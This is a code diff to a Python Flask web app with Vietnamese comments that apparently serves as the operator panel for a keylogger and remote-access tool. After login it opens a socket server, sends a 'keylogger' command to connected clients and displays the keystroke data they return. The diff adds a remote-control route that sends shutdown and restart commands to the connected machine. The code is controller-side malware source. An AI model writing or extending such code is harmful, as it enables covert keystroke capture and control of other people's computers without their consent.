@@ -1,5 +1,5 @@
 import socket
-from flask import Flask, request, render_template
+from flask import Flask, request, jsonify, render_template
 import sqlite3
 import threading
 
@@ -11,6 +11,7 @@ def handle_client(client_socket,client_address):
     global data_received  
     while True:
         try:
+            # client_socket, client_address = server_socket.accept()
             print('Nhận kết nối từ', client_address)
             client_socket.send('keylogger'.encode('utf-8'))
 
@@ -54,6 +55,7 @@ def handle_client(client_socket,client_address):
             client_socket.close()
             
 def start_socket_server():
+    global client_socket
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 8080
 
@@ -78,10 +80,9 @@ def start_socket_server():
     finally:
         server_socket.close()
         
-      
 @app.route('/', methods=['GET', 'POST'])
 def login():
-    global is_logged_in  
+    global is_logged_in  # Declare is_logged_in as a global variable
 
     if request.method == 'POST':
         username = request.form['name']
@@ -105,6 +106,7 @@ def login():
 
             if user:
                 is_logged_in = True
+                # threading.Thread(target=handle_client).start()
                 socket_server_thread = threading.Thread(target=start_socket_server)
                 socket_server_thread.start()
                 return render_template('index.html', is_logged_in=is_logged_in)
@@ -120,10 +122,22 @@ def login():
 def keylogger_router():
     return render_template('keylogger.html', data_received=data_received)
 
-@app.route('/remote-control')
-def remoteRouter():
-    # Xử lý logic cho chức năng "Điều khiển máy tính" ở đây
-    return render_template('remote-control.html')  
 
+@app.route('/remote-control',methods=['GET','POST'])
+def remote_router():
+    if request.method == 'POST':
+        data = request.get_json()
+        action = data.get('action')
+        print("Action: " ,action)
+        
+        if action == 'shutdown':
+            client_socket.send('shutdown'.encode('utf-8'))
+            return jsonify(message='Đã thực hiện thành công hành động shutdown!')
+
+        elif action == 'restart':
+            client_socket.send('restart'.encode('utf-8'))
+            return jsonify(message='Đã thực hiện thành công hành động restart!')
+
+    return render_template('remote-control.html')  
 if __name__ == '__main__':
     app.run(debug=True, port=8000)
